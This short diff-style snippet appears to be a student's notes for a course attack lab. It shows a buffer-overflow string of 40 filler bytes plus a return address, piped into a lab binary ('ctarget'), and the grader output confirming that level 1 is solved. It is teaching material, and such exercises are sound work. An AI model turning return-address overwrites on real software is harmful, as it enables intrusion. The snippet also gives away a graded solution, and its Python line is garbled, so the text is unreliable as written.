@@ -1,0 +1,10 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0@\0\0 (cant input directly since it has \0) SO:
+
+(base) [lotte target7]$ python3 -c 'import sys; sys.stdout.buffer.write(.write(
+b"A"*40 + b"\x00\x30\x40\x00\x00\x00\x00\x00"
+)' | ./ctarget
+Cookie: 0x2d274378
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
